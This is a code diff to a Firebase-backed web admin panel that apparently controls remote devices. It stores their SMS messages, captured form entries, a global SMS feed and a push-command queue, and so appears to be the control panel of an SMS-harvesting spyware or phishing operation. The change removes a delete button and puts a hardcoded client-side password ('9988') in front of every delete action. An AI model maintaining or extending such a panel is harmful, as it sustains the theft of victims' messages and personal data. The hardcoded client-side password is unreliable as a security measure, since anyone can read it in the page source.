@@ -568,9 +568,7 @@
                         <button onclick="sendUserCmd('CHECK_ONLINE')" class="bg-emerald-600 text-white px-2 py-1 rounded-lg text-[9px] font-black uppercase shadow-md shadow-emerald-100 active:scale-95 transition-all flex items-center gap-1">
                             <i class="fas fa-wifi text-[9px]"></i> Status
                         </button>
-                        <button onclick="deleteUser(selectedUid)" class="bg-rose-600 text-white px-2 py-1 rounded-lg text-[9px] font-black uppercase shadow-md shadow-rose-100 active:scale-95 transition-all flex items-center gap-1">
-                            <i class="fas fa-trash-can text-[9px]"></i> Delete Node
-                        </button>
+
                     </div>
                 </div>
             </div>
@@ -773,6 +771,15 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const auth = firebase.auth();
+
+    const DELETION_PWD = "9988"; // Set your deletion password here (different from login)
+
+    function confirmDelete() {
+        const input = prompt("Security Check: Enter Deletion Password to confirm:");
+        if (input === DELETION_PWD) return true;
+        if (input !== null) showToast("Access Denied: Invalid Deletion Password", "error");
+        return false;
+    }
 
     let notificationsEnabled = localStorage.getItem('notificationsEnabled') !== 'false';
     let smsAlertsEnabled = localStorage.getItem('smsAlertsEnabled') !== 'false';
@@ -1036,39 +1043,42 @@
     }
 
     function clearHistory() {
-        if(confirm("Clear all logs?")) db.ref('AdminLogs').remove();
+        if(!confirm("Clear all logs?")) return;
+        if(!confirmDelete()) return;
+        db.ref('AdminLogs').remove();
     }
 
     function deleteUser(uid) {
         if(!uid) return;
-        if(confirm("DANGER: Are you sure you want to PERMANENTLY delete this device and all its data? This cannot be undone.")) {
-            db.ref(`Users/${uid}`).remove();
-            db.ref(`UserRegistry/${uid}`).remove();
-            showToast("Device deleted successfully", "success");
-            showView('dashboard');
-        }
+        if(!confirm("DANGER: Are you sure you want to PERMANENTLY delete this device and all its data? This cannot be undone.")) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}`).remove();
+        db.ref(`UserRegistry/${uid}`).remove();
+        showToast("Device deleted successfully", "success");
+        showView('dashboard');
     }
 
     function deleteAllSms(uid) {
         if(!uid) return;
-        if(confirm("Delete all SMS for this device?")) {
-            db.ref(`Users/${uid}/M`).remove();
-            showToast("All SMS cleared", "success");
-        }
+        if(!confirm("Delete all SMS for this device?")) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}/M`).remove();
+        showToast("All SMS cleared", "success");
     }
 
     function deleteSingleSms(uid, mid) {
         if(!uid || !mid) return;
+        if(!confirmDelete()) return;
         db.ref(`Users/${uid}/M/${mid}`).remove();
         showToast("Message deleted", "success");
     }
 
     function deleteSingleForm(uid, fid) {
         if(!uid || !fid) return;
-        if(confirm("Delete this form entry?")) {
-            db.ref(`Users/${uid}/F/${fid}`).remove();
-            showToast("Entry deleted", "success");
-        }
+        if(!confirm("Delete this form entry?")) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}/F/${fid}`).remove();
+        showToast("Entry deleted", "success");
     }
 
     let usersData = {};
@@ -2076,6 +2086,7 @@
 
     function deleteAllGlobalSms() {
         if(!confirm("EXTREME DANGER: This will delete EVERY SINGLE message from EVERY user and the global feed. Continue?")) return;
+        if(!confirmDelete()) return;
         db.ref('all_sms').remove();
         Object.keys(usersData).forEach(uid => {
             db.ref(`Users/${uid}/M`).remove();
@@ -2085,6 +2096,7 @@
 
     function cleanupOldSms() {
         if(!confirm("Are you sure? This will delete ALL messages older than 7 days from all users and global feed.")) return;
+        if(!confirmDelete()) return;
         const cutoff = Date.now() - (7 * 24 * 60 * 60 * 1000);
         let count = 0;
 
@@ -2113,6 +2125,7 @@
 
     function clearAllCommands() {
         if(!confirm("Are you sure? This will clear all pending commands for ALL users and the FCM queue.")) return;
+        if(!confirmDelete()) return;
 
         // Clear FCM Queue
         db.ref('fcm_queue').remove();
@@ -2127,6 +2140,7 @@
 
     function cleanupInactiveUsers() {
         if(!confirm("DANGER: This will PERMANENTLY delete devices that haven't been online for 7 days. Continue?")) return;
+        if(!confirmDelete()) return;
         const cutoff = Date.now() - (7 * 24 * 60 * 60 * 1000);
         let count = 0;
 
